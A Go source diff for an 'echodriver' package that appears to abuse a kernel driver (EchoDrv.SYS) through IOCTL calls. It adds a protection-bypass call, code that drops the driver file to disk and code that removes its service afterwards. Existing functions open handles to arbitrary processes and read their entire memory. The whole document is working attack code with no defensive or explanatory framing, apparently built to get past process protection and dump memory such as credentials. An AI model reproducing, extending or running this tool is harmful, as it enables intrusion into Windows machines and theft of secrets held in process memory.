@@ -2,16 +2,20 @@ package driver
 
 import (
 	"bytes"
+	"echodriver/services"
 	"echodriver/utils"
 	"fmt"
+	"os"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
 )
 
 const (
+	IOCTL_BYPASS         = 0x9e6a0594
 	IOCTL_PROCESS_HANDLE = 0xe6224248
 	IOCTL_READ_MEMORY    = 0x60a26124
+	WRITE_PERMS          = 0644
 )
 
 type KGetHandle struct {
@@ -39,7 +43,7 @@ type MemoryBasicInformation struct {
 	Type              uint32
 }
 
-var DRIVER_NAME = "ECHODRIVER.SYS"
+var DRIVER_NAME = "EchoDrv.SYS"
 var DRIVER_FULL_PATH, _ = windows.FullPath(DRIVER_NAME)
 
 func GetDriverHandle() (*windows.Handle, error) {
@@ -53,6 +57,17 @@ func GetDriverHandle() (*windows.Handle, error) {
 	return &hDriver, nil
 }
 
+func BypassProtection(hDriver windows.Handle) error {
+
+	buf := make([]byte, 4096)
+	var bytesR uint32
+	if err := windows.DeviceIoControl(hDriver, IOCTL_BYPASS, nil, 0, &buf[0], uint32(len(buf)), &bytesR, nil); err != nil {
+		return err
+	}
+
+	return nil
+}
+
 func GetProcHandle(hDriver windows.Handle, pid int) (windows.Handle, error) {
 	var param KGetHandle
 	param.PID = uint32(pid)
@@ -61,16 +76,31 @@ func GetProcHandle(hDriver windows.Handle, pid int) (windows.Handle, error) {
 	paramSize := uint32(unsafe.Sizeof(param))
 	var bytesReturned uint32
 
-	err := windows.DeviceIoControl(hDriver, IOCTL_PROCESS_HANDLE,
+	err := windows.DeviceIoControl(hDriver, 0xe6224248,
 		(*byte)(unsafe.Pointer(&param)), paramSize,
 		(*byte)(unsafe.Pointer(&param)), paramSize,
 		&bytesReturned, nil)
 
 	if err != nil {
-		return 0, fmt.Errorf("devicecontrol failed %v", err)
+		return 0, fmt.Errorf("devicecontrol failed %v %v", err, windows.GetLastError())
 	}
 
+	fmt.Println(param)
+
 	return param.Handle, nil
+}
+
+func Clean() {
+	if err :=
+		services.RemoveService("EchoDrv", DRIVER_FULL_PATH); err != nil {
+		utils.ParseError(err)
+		return
+	}
+
+	if err := os.Remove(DRIVER_FULL_PATH); err != nil {
+		utils.ParseError(err)
+		return
+	}
 }
 
 func ReadMemoryRaw(hDriver windows.Handle, targetProcess windows.Handle, address uintptr, size uintptr) ([]byte, error) {
@@ -120,4 +150,11 @@ func ReadAllMemory(hDriver windows.Handle, targetProcess windows.Handle) (string
 	}
 
 	return result.String(), nil
+}
+
+func WriteDriver(bytes []byte) error {
+	if err := os.WriteFile(DRIVER_FULL_PATH, bytes, 0644); err != nil {
+		return err
+	}
+	return nil
 }
